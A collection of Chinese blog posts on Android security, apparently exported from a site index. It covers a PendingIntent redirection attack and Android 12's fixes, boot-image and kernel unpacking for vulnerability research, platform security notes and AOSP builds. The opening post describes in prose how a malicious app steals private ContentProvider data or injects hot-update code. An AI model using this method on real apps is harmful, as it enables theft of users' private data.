FLAG_GRANT_READ_URI_PERMISSION：Intent携带此标志时，Intent的接收者将获得Intent所携带data URI以及clipdata URI中的读权限； FLAG_GRANT_WRITE_URI_PERMISSION：Intent携带此标志时，Intent的接收者将获得Intent所携带data URI以及clipdata URI中的写权限。 简言之，恶意App将PendingIntent重定向到自身，通过对PendingIntent base Intent的部分修改（修改包名、授权标志和data/clipdata），使其以受害App的权限打开恶意App自身， 这样恶意App在被打开的瞬间即获得对受害App私有数据的读写权限。具体的利用方法如图所示： 步骤如下: 受害App通过getActivity构建PendingIntent，在通知、SliceProvider、窗口小部件中使用，假定其base Intent为隐式Intent; 攻击App 通过前面探讨的各种渠道获取受害App的PendingIntent; 攻击App修改PendingIntent中的base Intent，由于是隐式Intent，因此action、component和selector都不能修改。但可以做如下修改: 修改data或者clidpdata，使其URI指向受害App的私有ContentProvider; 修改package，指向攻击App; 添加FLAG_GRANT_READ_URI_PERMISSION和FLAG_GRANT_WRITE_URI_PERMISSION 标志。 同时攻击App声明一个Activity支持隐式启动，其Intent-filter与base Intent中的action一致。 攻击App调用PendingIntent.send; 由于这个PendingIntent代表了受害App的身份和权限，因此将以受害App的名义发送修改后的base Intent，打开攻击App的Activity; 在攻击App Activity被打开的瞬间，即被授权访问base Intent中携带的URI，也就获得了对受害App私有ContentProvider的读写权限。 上面受害App的私有ContentProvider，需要携带属性 grantUriPermission=true ，不限于受害App自己的ContentProvider，也包括受害App有权限访问的ContentProvider。手机上一个常⻅的具有 grantUriPermission=true 属性的ContentProvider就是代表通讯录的Contacts Provider，只要受害App具有 READ_CONTACTS 权限，出现这样一个PendingIntent漏洞后将导致通讯录泄露。 由于这里使用了grantUri的技巧，因此并不适用于broadcast PendingIntent，因为广播接收器是不可以被grantUri的。另外，从Android 5.0以后，Service不能隐式启动，因此也很难看到base Intent为隐式Intent的service PendingIntent。所以，这里的PendingIntent重定向攻击主要适用于Activity PendingIntent。 实践案例 一个攻击思路很多App都具有热更新功能，一般将dex/jar/apk/so等文件放在自己的私有目录中，如果这些私有目录可以被 grantUriPermission=true 的ContentProvider所引用，就可以利用PendingIntent重定向攻击去改写热更新文件，将攻击者自己的代码注入到其中，实现以受害App的权限执行任意代码。 安卓12安全变更首先，Google 对AOSP代码进行了全面排查，几乎修复了所有的不安全的PendingIntent。大部分的修复使用了PendingIntent.FLAG_IMMUTABLE，小部分的修复将base Intent设置为显式Intent。 在Android 12大版本中，安卓系统对PendingIntent的行为进行了重大安全变更，引入了一个新的标志PendingIntent.FLAG_MUTABLE，表示base Intent可以改写。与原有的FLAG_IMMUTABLE共同描述PendingIntent的可变性。 对于Target S+的App，Android系统要求开发者必须明确指定PendingIntent的可变性，FLAG_IMMUTABLE和FLAG_MUTABLE必须使用其一，否则系统会抛出异常。这就要求开发者对自己PendingIntent的使用有清晰的理解，知道PendingIntent是否会在将来被改写。 Google也对开发者提出了详细的安全编码建议: 尽可能使用FLAG_IMMUTABLE来生成不可改写的PendingIntent; 如果使用FLAG_MUTABLE来生成可改写的PendingIntent，base Intent一定要使用显式Intent，明确指定Intent的组件。 同时AndroidStuido IDE中也引入了一个新的lint检查插件PendingIntentMutableFlagDetector，用于检查PendingIntent是否使用了FLAG_IMMUTABLE。 参考链接https://segmentfault.com/a/1190000041532963 https://segmentfault.com/a/1190000041550819 https://i.blackhat.com/EU-21/Wednesday/EU-21-He-Re-route-Your-Intent-for-Privilege-Escalation-A-Universal-Way-to-Exploit-Android-PendingIntents-in-High-profile-and-System-Apps.pdf","link":"/2022/05/08/Android-PendingIntent%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF/"},{"title":"Android内核信息收集","text":"前言最近在验证Android内核漏洞时，涉及到算内核函数或数据结构偏移的问题，发现没有这方面的知识储备，于是准备收集整理记录这方面的知识。 三星固件包解压了一个三星的固件包中的AP_G9730ZCU5FUC2_CL21058543_QB38745533_REV00_user_low_ship_MULTI_CERT_meta_OS11.tar.md5 .tar.md5指的是压缩已验证，TAR文件包含固件和其他系统数据，而.MD5 扩展程序验证没有数据损坏，这是三星的格式 直接将 .tar.md5 重命名为 .tar，然后再用 Odin 刷入，就不会校验了，不管这个线刷包有没有做 .tar.md5 的步骤。 然后得到了以下文件： 12345678910d----- meta-data-a---- 23656325 boot.img.lz4-a---- 1292 dqmdbg.img.ext4.lz4-a---- 953562 dtbo.img.lz4-a---- 1923 persist.img.ext4.lz4-a---- 37936471 recovery.img.lz4-a---- 3299056890 system.img.ext4.lz4-a---- 2190845341 userdata.img.ext4.lz4-a---- 3447 vbmeta.img.lz4-a---- 812012780 vendor.img.ext4.lz4 vbmeta镜像的作用验证启动（Verified Boot）是Android一个重要的安全功能，主要是为了访问启动镜像被篡改，提高系统的抗攻击能力，简单描述做法就是在启动过程中增加一条校验链，即 ROM code 校验 BootLoader，确保 BootLoader 的合法性和完整性，BootLoader 则需要校验 boot image，确保 Kernel 启动所需 image 的合法性和完整性，而 Kernel 则负责校验 System 分区和 vendor 分区。 由于 ROM code 和 BootLoader 通常都是由设备厂商 OEM 提供，而各家实际做法和研发能力不尽相同，为了让设备厂商更方便的引入 Verified boot 功能，Google 在 Android O上推出了一个统一的验证启动框架 Android verified boot 2.0，好处是既保证了基于该框架开发的verified boot 功能能够满足 CDD 要求，也保留了各家 OEM 定制启动校验流程的弹性。 由于 ROM code 校验 BootLoader 的功能通常与 IC的设计相关，所以 AVB 2.0 关注的重点在 BootLoader 之后的校验流程。BootLoader 之后系统启动所涉及的关键镜像通常包括 boot.img，system.img，Android O 的 treble Project 还引入了 dtbo 和 vendor.img。这些 image 挨个校验可以说费时费力，而 AVB 2.0 的做法事实上十分简单，引入一个新的分区：vbmeta.img（verified boot metadata），然后把所有需要校验的内容在编译时就计算好打包到这个分区，那么启动过程中 BootLoader 只需要校验 vbmeta.img，就能确认 vbmeta 内的数据是否可信。再用 vbmeta 中的数据去比对 bootimg，dtbo，system.img，vendor.img 即可。至于 OEM 是还需要放什么其他东西到 vbmeta 中，则可以由 OEM 自由定制，可以说保留了很好的客制化空间。 除了最基本的验证启动之外，AVB 2.0 还提供防止回滚的功能和对AB分区备份的支持，具体的可以看README文档（安卓源码external/avb/README.md）。 dtbo镜像设备树 (DT) 是用于描述“不可发现”硬件的命名节点和属性构成的一种数据结构。操作系统（例如在 Android 中使用的 Linux 内核）会使用 DT 来支持 Android 设备使用的各种硬件配置。硬件供应商会提供自己的 DT 源文件，接下来 Linux 会将这些文件编译到引导加载程序使用的设备树 Blob (DTB) 文件中。 参考官方文档设备树叠加层。 System 镜像介绍System 镜像一般有两种格式，一种为 ext4 image，一种为 sparse image。 线刷包中的 system image，采用的是 sparse image 格式，而刷入完成直接采用 dd 或 cat 命令备份出来，则是 ext4 格式。 Android内核配置提取/proc/config.gz CPU信息/sys/devices/system/cpu/ cat /sys/devices/system/cpu/cpu7/cpufreq/cpuinfo_max_freq android系统的分区比较重要的几个分区如下： 1、/boot分区：该分区主要包含android kernel镜像和ramdisk（一种将RAM模拟为硬盘的技术，提高访问速度）。 2、/system分区：该分区主要存放Android框架及其相关配置，包含系统预装的app。 3、/recovery分区：该分区主要是备份的分区 4、/data 用户数据的存储区域 123/data/app/com.xxxx/ 以包名存放应用安装文件，包括base.apk /lib/data/data/com.xxxx/ 存放应用数据，包括sp、db等/data/dalvik-cache 以包名存放优化过的应用dex文件 5、/cache分区：Android系统缓存区域，保存系统最常访问的数据和应用程序。 6、/misc分区：此分区包含一些系统功能设置开关和数据，比如USB设置。 7、/sdcard分区：外置存储分区 8、/vendor分区：厂商定制的分区，厂商的某些系统升级可以通过这个分区来实现。 boot.imgboot.img就是android系统的Linux内核主要的镜像文件，在该文件中大致包含boot header，kernel，ramdisk。 boot.img文件跳过2K的文件头之后，包含两个gz压缩包，一个是boot.img-kernel.gz Linux内核，一个是boot.img-ramdisk.cpio.gz，然后加上ramdisk文件。boot.img文件在针对kernel是有不同压缩算法来进行压缩的。 大致的结构图如下 ADB提取boot镜像从手机中提取需要用到root权限，这对实际漏洞来讲有些苛刻。 1dd if=/dev/block/by-name/boot of=/sdcard/boot.img 然后使用 ADB 拖到电脑备用. binwalk解包12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 » python3 /usr/local/lib/python3.8/dist-packages/binwalk-2.3.3-py3.8.egg/binwalk boot.imgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 Android bootimg, kernel size: 50209697 bytes, kernel addr: 0x8000, ramdisk size: 0 bytes, ramdisk addr: 0x0, product name: &quot;RILRI20B005&quot;169252 0x29524 SHA256 hash constants, little endian185108 0x2D314 SHA256 hash constants, little endian188820 0x2E194 AES Inverse S-Box16556401 0xFCA171 Certificate in DER format (x509 v3), header length: 4, sequence length: 2112924670228 0x1787014 ELF, 64-bit LSB shared object, version 1 (SYSV)24693124 0x178C984 gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)25614492 0x186D89C Compiled Java class data, version 0.025621020 0x186F21C Compiled Java class data, version 0.025644484 0x1874DC4 Compiled Java class data, version 0.025651012 0x1876744 Compiled Java class data, version 0.025876272 0x18AD730 Zlib compressed data, compressed25877304 0x18ADB38 Zlib compressed data, compressed25877824 0x18ADD40 Zlib compressed data, default compression25878856 0x18AE148 Zlib compressed data, default compression25895274 0x18B216A Private key in DER format (PKCS header length: 4, sequence length: 79925972564 0x18C4F54 DES SP2, little endian25973076 0x18C5154 DES SP1, little endian25987348 0x18C8914 CRC32 polynomial table, little endian26020915 0x18D0C33 HTML document header26021215 0x18D0D5F HTML document footer26693504 0x1974F80 CRC32 polynomial table, little endian27586276 0x1A4EEE4 ELF, 64-bit LSB shared object, version 1 (GNU/Linux)27587596 0x1A4F40C Certificate in DER format (x509 v3), header length: 4, sequence length: 108727588687 0x1A4F84F Certificate in DER format (x509 v3), header length: 4, sequence length: 116927589860 0x1A4FCE4 Certificate in DER format (x509 v3), header length: 4, sequence length: 116127593748 0x1A50C14 ELF, 64-bit LSB shared object, version 1 (GNU/Linux)27595068 0x1A5113C Certificate in DER format (x509 v3), header length: 4, sequence length: 108727596159 0x1A5157F Certificate in DER format (x509 v3), header length: 4, sequence length: 116927597332 0x1A51A14 Certificate in DER format (x509 v3), header length: 4, sequence length: 116127987715 0x1AB0F03 Base64 standard index table28041856 0x1ABE280 SHA256 hash constants, little endian28051156 0x1AC06D4 AES Inverse S-Box33382378 0x1FD5FEA Unix path: /home/dpi/qb5_8814/workspace/P4_1716/android/kernel/msm-4.14/arch/arm64/kernel/entry.S33941962 0x205E9CA Unix path: /dev/block/bootdevice/by-name/param33946482 0x205FB72 Unix path: /dev/block/platform/soc/%s/by-name/debug34055474 0x207A532 Unix path: /sys/kernel/debug/dri.34066784 0x207D160 Unix path: /sys/kernel/debug/dri/%pd/%s34066849 0x207D1A1 Unix path: /sys/kernel/debug/dri/%s34066988 0x207D22C Unix path: /sys/kernel/debug/dri.34318013 0x20BA6BD Unix path: /sys/kernel/debug/dri/%pd/perf34431339 0x20D616B Unix path: /lib/firmware/updates/4.14.190-21058543-abG9730ZCU5FUC234435626 0x20D722A Unix path: /dev/disk/by-partlabel34536061 0x20EFA7D Unix path: /sys/kernel/debug/.../reset_controller34696677 0x2116DE5 Neighborly text, &quot;neighbor reportbr_req&quot;34696768 0x2116E40 Neighborly text, &quot;neighbor reportiled to send neighbor report request, error=%d&quot;34696844 0x2116E8C Neighborly text, &quot;neighbor report request, error=%d_list&quot;34709707 0x211A0CB Neighborly text, &quot;Neighbor Report frame with incorrect length %dhbor report (token = %d)&quot;34709766 0x211A106 Neighborly text, &quot;neighbor report (token = %d)nt with length %d&quot;34709808 0x211A130 Neighborly text, &quot;Neighbor Report element with length %dxx:xx:x%x:%02x&quot;34895079 0x21474E7 Base64 standard index table34948093 0x21543FD PARity archive data - file number 2054935031879 0x2168B47 Unix path: /dev/bus/usb/%03d/%03d35643506 0x21FE072 Copyright string: &quot;Copyright(c) Pierre Ossman&quot;35706231 0x220D577 Unix path: /sys/firmware/devicetree/base35708171 0x220DD0B Unix path: /sys/firmware/fdt': CRC check failed36119484 0x22723BC Unix path: /sys/class/sec/hall_ic/hall_detect36144593 0x22785D1 Unix path: /sys/class/lcd/panel/SVC_OCTA36147765 0x2279235 Unix path: /sys/class/lcd/panel/window_type36579849 0x22E2A09 Neighborly text, &quot;neighbor table overflow!s %x&quot;36623432 0x22ED448 Neighborly text, &quot;NeighborSolicitsdev_snmp6&quot;36623449 0x22ED459 Neighborly text, &quot;NeighborAdvertisementsnuse %d&quot;36629463 0x22EEBD7 Neighborly text, &quot;neighbor %.2x%.2x.%pM lostename link %s to %s&quot;36649206 0x22F38F6 Neighborly text, &quot;NeighborhHWMPactivePathTimeout&quot;40332015 0x2676AEF Certificate in DER format (x509 v3), header length: 4, sequence length: 92840349716 0x267B014 Certificate in DER format (x509 v3), header length: 4, sequence length: 135340352532 0x267BB14 Certificate in DER format (x509 v3), header length: 4, sequence length: 92840392092 0x268559C ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev&quot;, file name length: &quot;0x00000004&quot;, file size: &quot;0x00000000&quot;40392208 0x2685610 ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev/console&quot;, file name length: &quot;0x0000000C&quot;, file size: &quot;0x00000000&quot;40392332 0x268568C ASCII cpio archive (SVR4 with no CRC), file name: &quot;root&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x00000000&quot;40392448 0x2685700 ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;45887996 0x2BC31FC Unix path: /sys/power/cpufreq_max_limit 149760045888040 0x2BC3228 Unix path: /sys/power/cpufreq_max_limit -146123652 0x2BFCA84 LZMA compressed data, properties: 0xC8, dictionary size: 536870912 bytes, uncompressed size: 78 bytes48199859 0x2DF78B3 Intel x86 or x64 microcode, pf_mask 0x8000, 2000-01-20, size 1888256049215524 0x2EEF824 Flattened device tree, size: 500187 bytes, version: 1749715711 0x2F699FF Flattened device tree, size: 497909 bytes, version: 1750213620 0x2FE32F4 Flattened device tree, size: 173 bytes, version: 17 博客上说的内核地址并没有，可能是三星的魔改太多： 可以用binwalk -e提取，但是效果差点。 unpackbootimg解包可以用这个https://github.com/anestisb/android-unpackbootimg或https://github.com/osm0sis/mkbootimg提取，还有`imgtool`提取。 提取出来的结果： 123456789101112131415➜ ./unpackbootimg -i boot.img -o boot-outANDROID! magic found at: 0BOARD_KERNEL_CMDLINE console=null androidboot.hardware=qcom androidboot.console=ttyMSM0 androidboot.memcg=1 lpm_levels.sleep_disabled=1 video=vfb:640x400,bpp=32,memsize=3072000 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 androidboot.usbcontroller=a600000.dwc3 firmware_class.path=/vendor/firmware_mnt/imageBOARD_KERNEL_BASE 0x00000000BOARD_NAME RILRI20B005BOARD_PAGE_SIZE 4096BOARD_HASH_TYPE sha1BOARD_KERNEL_OFFSET 0x00008000BOARD_RAMDISK_OFFSET 0x00000000BOARD_SECOND_OFFSET 0x00000000BOARD_TAGS_OFFSET 0x01e00000BOARD_OS_VERSION 11.0.0BOARD_OS_PATCH_LEVEL 2021-03BOARD_HEADER_VERSION 1BOARD_HEADER_SIZE 1648 123456789101112131415161718➜ ls -altotal 98168drwxr-xr-x 2 DarkMatter staff 544 6 23 21:16 .drwx------@ 4 DarkMatter staff 544 6 23 21:16 ..-rw-r--r-- 1 DarkMatter staff 11 6 23 21:16 boot.img-base-rw-r--r-- 1 DarkMatter staff 12 6 23 21:16 boot.img-board-rw-r--r-- 1 DarkMatter staff 301 6 23 21:16 boot.img-cmdline-rw-r--r-- 1 DarkMatter staff 5 6 23 21:16 boot.img-hashtype-rw-r--r-- 1 DarkMatter staff 3 6 23 21:16 boot.img-header_version-rw-r--r-- 1 DarkMatter staff 50209697 6 23 21:16 boot.img-kernel-rw-r--r-- 1 DarkMatter staff 11 6 23 21:16 boot.img-kernel_offset-rw-r--r-- 1 DarkMatter staff 8 6 23 21:16 boot.img-os_patch_level-rw-r--r-- 1 DarkMatter staff 7 6 23 21:16 boot.img-os_version-rw-r--r-- 1 DarkMatter staff 5 6 23 21:16 boot.img-pagesize-rw-r--r-- 1 DarkMatter staff 0 6 23 21:16 boot.img-ramdisk-rw-r--r-- 1 DarkMatter staff 11 6 23 21:16 boot.img-ramdisk_offset-rw-r--r-- 1 DarkMatter staff 11 6 23 21:16 boot.img-second_offset-rw-r--r-- 1 DarkMatter staff 11 6 23 21:16 boot.img-tags_offset 这里boot.img-kernel显示是未压缩的镜像： 1234➜ hexdump -C -n 32 boot.img-kernel00000000 55 4e 43 4f 4d 50 52 45 53 53 45 44 5f 49 4d 47 |UNCOMPRESSED_IMG|00000010 10 e8 ee 02 00 00 96 14 00 00 00 00 00 00 08 00 |.��.............|00000020 imjtool解包(没测试)这里使用imjtool工具： 1./imjtool &lt;path to boot.img&gt; extract 解包后的文件将被放在./extracted目录, 分别有kernel(内核image), kernelimage(内核defconfig), ramdisk(ramdisk包, 通常是cpio格式) 预处理Image这里我们选择droidimg来配合IDA Pro完成这个任务。 跳过头部标识 Linux内核在生成的时候有时会在头部添加一些信息, 以供fastboot读取. 一般来说分别是, 16字节的UNCOMPRESSED_IMG和4字节的大小信息。 验证 这里先直接使用IDA Pro打开未经处理的Image, 处理器类型记得选择ARM Little-endian(不用纠结, Android设备全是Little-endian), 一路确定就行。 切换到16进制查看器页面, 可以很清楚的看到头部有UNCOMPRESSED_IMG标识。 处理 1dd if=&lt;path to origin image&gt; of=&lt;path to patched image&gt; bs=1 skip=20 对启用kaslr的内核进行额外处理 验证 还记得刚刚拿到的kernelimage不, 打开他. 搜索CONFIG_RANDOMIZE_BASE=y, 如果有匹配内容说明就需要进行下一步处理了 处理 进入droidimg目录并自行编译fix_kaslr_arm64.c。 1&lt;fix_kaslr_arm64&gt; &lt;patch to origin image&gt; &lt;path to patched image&gt; 反编译Image安装droidimg到ida将droidimg目录下的vmlinux.py复制进IDA Pro安装目录下的loaders里, 注意你可能需要解决相应的python依赖。 打开Image最后用IDA Pro打开我们最终的Image, 文件类型选择Android/Linux Kernel Image(ARM)即可。 vmlinux-to-elf(强烈推荐🌟)这个工具好使https://github.com/marin-m/vmlinux-to-elf，能解析出`boot.img`中不少东西。 生成一个 .ELF 文件，您可以使用 IDA Pro 和 Ghidra 进行分析。 功能： 将原始文件 [OK blob] 或 ELF 内核作为输入 自动检测和解包 Linux 内核使用的主要压缩格式 [OK] 输入文件中并查找嵌入内核符号表(kalls) [OK] 其他指令集架构、字节序位大小、依赖于的通用函数签名 [OK] 从 kallsyms 中包含的符号接线器内核的表点 [OK] 内核为内核，提供基本解释，它考虑低基地址（现在是第一个地址） 解压某种类型的 Android boot.img文件，以一种ANDROID!或UNCOMPRESSED_IMG魔术的形式呈现 [OK] 使用 IDA Pro 或 Ghidra 生成可完全分析的 .ELF 文件作为输出 [OK] 安装直接python setup.py install即可。","link":"/2022/06/23/Android%E5%86%85%E6%A0%B8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"Android安全笔记","text":"前言整理一下 Android APP安全相关的笔记，有些是已经知道了的，但是没有去系统的记录梳理。 安全问题分类四大组件Android的四大组件有两种对外开放的方式： 通过在manifest文件中声明exported=true； 如果没有1中的声明，可以通过隐式的Intent进行访问。影响：其他程序可以进行劫持，如果对传入的Intent数据处理不够，有可能导致Dos攻击。解决方案：显示声明exported=false，或者指定Intent的类，或者对权限进行限制。 WebviewAndroid4.4之前，可以通过js注入获取客户端信息，代码如下： 1mWebView.addJavascriptInterface(new JsToJava(), &quot;myjsfunction&quot;); 4.4之后需要加入@JavascriptInterface注解。 APP流量请求问题主要是指APP使用了HTTP，或者是HTTPS的证书校验不够，导致可以进行中间人攻击，其实就是去实现Android的抓包分析，具体可以看《Android中间人攻击方法整理》这篇笔记。 Android系统安全知识Android安全主要由系统框架实现、开发者构建设计和用户授权三个部分。Android安全设计理念：应用程序不应该损害操作系统资源、用户和其他应用程序。因此Android实现了两个层次的安全机制： Linux层：为每个应用程序分配单独的 Unix 用户（UID）和组（GID）标识符。强制在单独的 Linux 进程中运行每个应用程序。 1.1 Android 中有一些地方可以用于设置文件、驱动和 Unix 套接字的文件系统权限：init程序、init.rc配置文件、ueventd.rc配置文件和系统 ROM 文件系统配置文件。 框架层：init进程，位于 Android 文件系统的根目录中，负责创建文件系统基本条目，程序解析init.rc配置文件并执行其中的命令。1234567891011121314151617181920 1 int main( int argc, char **argv ) 2 { 3 ... 4 if (!strcmp (basename( argv[0] ), &quot;ueventd&quot;) ) 5 return ueventd_main ( argc, argv ) ; 6 ... 7 mkdir(&quot;/dev&quot;, 0755) ; 8 mkdir(&quot;/proc&quot;, 0755) ; 9 mkdir(&quot;/sys&quot;, 0755) ; 10 11 mount(&quot;tmpfs&quot;, &quot;/dev&quot;, &quot;tmpfs&quot;, MS_NOSUID, &quot;mode=0755&quot;) ; 12 mkdir(&quot;/dev/pts&quot;, 0755) ; 13 mkdir(&quot;/dev/socket&quot;, 0755) ; 14 mount(&quot;devpts&quot;, &quot;/dev/pts&quot;, &quot;devpts&quot;, 0, NULL) ; 15 mount(&quot;proc&quot;, &quot;/proc&quot;, &quot;proc&quot;, 0, NULL) ; 16 mount(&quot;sysfs&quot;, &quot;/sys&quot;, &quot;sysfs&quot;, 0, NULL) ; 17 ... 18 init_parseconfig_file(&quot;/init.rc&quot;) ; 19 ... 20 } init.rc配置文件使用一种称为 Android Init Language 的语言编写，位于根目录下。在init.rc配置文件中编写的命令定义系统全局变量，为内存管理设置基本内核参数，配置文件系统，启动几个守护进程和进程（不会完全继承init的root权限），更重要的是负责基本文件系统结构的创建，并为创建的节点分配所有者和文件系统权限。12345671 on fs 2 # mount mtd partitions 3 # Mount /system rw first to give the filesystem a chance to save a checkpoint 4 mount yaffs2 mtd@system /system 5 mount yaffs2 mtd@system /system ro remount 6 mount yaffs2 mtd@userdata /data nosuid nodev 7 mount yaffs2 mtd@cache /cache nosuid nodev 第一个派生自init的守护进程是ueventd守护进程，通过读取ueventd.rc和ueventd.[device name].rc配置文件，重放指定的内核uevent_hotplug事件。 这些事件设置了不同设备的所有者和权限。之后，守护进程等待监听所有未来的热插拔事件。1234561 ...2 /dev/ashmem 0666 root root 3 /dev/binder 0666 root root 4 ...5 /dev/cam 0660 root camera 6 ... 由init程序启动的核心服务之一是servicemanager。 此服务充当在 Android 中运行的所有服务的索引。init进程启动的另一个核心进程是 Zygote。这个不用多说，需要注意的是，Zygote派生的新进程的内存具有“写时复制”（COW）保护，这意味着只有当后者尝试写入受保护的内存时，数据才会从 zygote 进程复制到新进程。init还会启动其他的进程，不多说了。 Android权限，如System权限等，然后又在此基础上，对权限的等级进行了划分，也就是normal、dangerous、signature和signatureOrSystem。系统权限的定义位于frameworks/base/core/res中。 组件相关 Activity在Manifest中有一个配置叫做android:priority ，即优先级。这个配置在AOSP的系统应用中很常见，当Intent可以resolve到多个Activity时，如果其中存在高优先级的Activity则会被直接选择，并不会触发用户选择的流程。 Intent有个非常特殊的地方，即Component和Package是两个互不相关的变量，在resolve一个Intent时，Component的优先级是最高的，当它被设置时，mPackage会被直接忽略。","link":"/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"},{"title":"Android源码笔记","text":"前言记一下有关Android源码的相关知识。 系统架构如下图所示，Android整体上分为5层，分别是系统应用、应用框架、系统运行库(Native C/C++库和Android运行时)、硬件抽象层HAL以及Linux内核。 系统应用层Android 随附一套用于电子邮件、短信、日历、互联网浏览和联系人等的核心应用。 应用框架层开发所需的java API。 名称 功能描述 名称 功能 Activity Manager(活动管理器) 管理各个应用程序生命周期以及通常的导航回退功能 Location Manager(位置管理器) 提供地理位置以及定位功能服务 Package Manager(包管理器) 管理所有安装在Android系统中的应用程序 Notification Manager(通知管理器) 应用程序可以在状态栏中显示自定义的提示信息 Resource Manager(资源管理器) 提供应用程序使用的各种非代码资源，如本地化字符串、图片、布局文件、颜色文件等 Telephony Manager(电话管理器) 管理所有的移动设备功能 Window Manager(窗口管理器) 管理所有开启的窗口程序 Content Providers(内容提供器) 使不同应用程序之间共享数据 View System(视图系统) 构建应用程序的基本组件 系统运行库层Native C/C++库如果开发的是需要 C 或 C++ 代码的应用，可以使用 Android NDK 直接从原生代码访问某些原生平台库。 名称 功能 OpenGL ES 3D绘图函数库 Libc 从BSD继承来的标准C系统函数库，专门为基于嵌入式Linux的设备定制 Media Framework 多媒体库，支持多种常用的音频、视频格式录制和回放 SQLite 轻型的关系型数据库引擎 SGL 底层的2D图形渲染引擎 SSL 安全套接层，是为网络通信提供安全及数据完整性的一种安全协议 FreeType 可移植的字体引擎，它提供统一的接口来访问多种字体格式文件 Android运行时对于运行 Android 5.0（API 级别 21）或更高版本的设备，每个应用都在其自己的进程中运行，并且有其自己的 Android Runtime (ART) 实例。ART 编写为通过执行 DEX 文件在低内存设备上运行多个虚拟机（DEX 文件是一种专为 Android 设计的字节码格式，经过优化，使用的内存很少）。 ART 的部分主要功能包括： 预先 (AOT) 和即时 (JIT) 编译 优化的垃圾回收 (GC) 在 Android 9（API 级别 28）及更高版本的系统中，支持将应用软件包中的 Dalvik Executable 格式 (DEX) 文件转换为更紧凑的机器代码。 更好的调试支持，包括专用采样分析器、详细的诊断异常和崩溃报告，并且能够设置观察点以监控特定字段 在 Android 版本 5.0（API 级别 21）之前，Android Runtime 是 Dalvik。如果应用在 ART 上运行良好，那么它应该也可在 Dalvik 上运行，但反过来不一定。 还有一点，在Dalvik下，应用每次运行的时候，字节码都需要通过即时编译器转换为机器码，这样会降低运行效率；而在ART 环境中，应用在第一次安装的时候/每次重启，字节码会预先编译成机器码。 Android 还包含一套核心运行时库，可提供 Java API 框架所使用的 Java 编程语言中的大部分功能，包括一些 Java 8 语言功能。 硬件抽象层硬件抽象层 (HAL) 提供标准界面，向更高级别的 Java API 框架显示设备硬件功能。HAL 包含多个库模块，其中每个模块都为特定类型的硬件组件实现一个界面，例如相机或蓝牙模块。当框架 API 要求访问设备硬件时，Android 系统将为该硬件组件加载库模块。 Linux内核层Android 平台的基础是 Linux 内核。例如，Android Runtime (ART) 依靠 Linux 内核来执行底层功能，例如线程和低层内存管理。 使用 Linux 内核可让 Android 利用主要安全功能，并且允许设备制造商为内核开发硬件驱动程序。 源码目录结构以下是Android7的源码结构，不同版本可能有些不同。 名称 功能 abi 应用程序二进制接口 art 全新的ART运行环境 bionic 系统C库 bootable 启动引导相关代码 build 存放系统编译规则及generic等基础开发包配置 cts Android兼容性测试套件标准 dalvik dalvik虚拟机 developers 开发者目录 development 应用程序开发相关 device 设备相关配置 docs 参考文档 external 开源模组相关文件 frameworks 应用程序框架，Android系统核心部分，由Java和C++编写 hardware 主要是硬件抽象层的代码 libcore 核心库相关文件 libnativehelper 动态库，实现JNI库的基础 ndk NDK相关代码，帮助开发人员在应用程序中嵌入C/C++代码 out 编译完成后代码输出在此目录 packages 应用程序包 pdk Plug Development Kit 的缩写，本地开发套件 platform_testing 平台测试 prebuilts x86和arm架构下预编译的一些资源 sdk sdk和模拟器 system 底层文件系统库、应用和组件 toolchain 工具链文件 tools 工具文件 Makefile 全局Makefile文件，用来定义编译规则 官方源码链接： android/platform/packages/apps：Android自带的app，比如Email,Camera, Music等，对于应用开发工程师主要关注的目录； android/platform/frameworks/base： Java framework，这是framework工程师看得最多的目录； android/platform/frameworks/native：Native framework android/platform/art：Art虚拟机 android/kernel/common：Android内核，这是驱动工程师最关注的模块； android/platform/system/core ：核心系统 android/platform/libcore：平台的lib库 安全机制参考这里。 下载Android源码12345$ wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar # 下载初始化包$ tar xf aosp-latest.tar$ cd aosp # 解压得到的 aosp 工程目录$ repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-8.1.0_r1 $ repo sync # 正常同步一遍即可得到完整目录 脚本 12345678#!/bin/bash echo &quot;======start repo sync======&quot; ./repo sync -j4while [ $? = 1 ]; do echo &quot;======sync failed, re-sync again======&quot; sleep 3 ./repo sync -j4 done 切换分支12345cd .repo/manifestsgit branch -a #查看所有分支repo init -b android-4.1.2_r1 # 切换分支repo sync 源码编译这里我要编译的是Pixel4XL，android-12.0.0_r1。 驱动先找到自己设备对应的驱动下载下来，如果不下载驱动直接编译源码，刷机后进不去系统。这里对应的驱动如下： Hardware Component Company Download SHA-256 Checksum Vendor image Google Link b456661c1b013d26fe7355db4787be0851c18b0852b41f4f25506a1884151b1e GPS, Audio, Camera, Gestures, Graphics, DRM, Video, Sensors Qualcomm Link 85a8d48d80e89994520d6221a3e5d35c720d43898e5107b2835b0cd889799307 解压上面两个压缩包到源码根目录下，然后执行： 123456# 解压tar zxvf qcom-coral-sp1a.210812.015-2133da5b.tgz -C./tar xvf google_devices-coral-sp1a.210812.015-b15979c9.tgz# 执行./extract-qcom-coral.sh./extract-google_devices-coral.sh 执行完会生成vendor目录。 编译123➜ aosp source build/envsetup.sh➜ aosp lunch➜ aosp make -j8 刷机123456789~/code/android11$ export ANDROID_PRODUCT_OUT=./out/target/product/blueline~/code/android11$ fastboot flashall -w...File system type raw not supported.Erasing 'metadata' OKAY [ 0.007s]Erase successful, but not automatically formatting.File system type raw not supported.Rebooting OKAY [ 0.000s]Finished. Total time: 101.511s 问题1：Could not find a supported mac sdk（mac sdk 版本不匹配）12345678--- FAIL: TestClippy (17.28s) --- FAIL: TestClippy/path= (17.00s) clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; 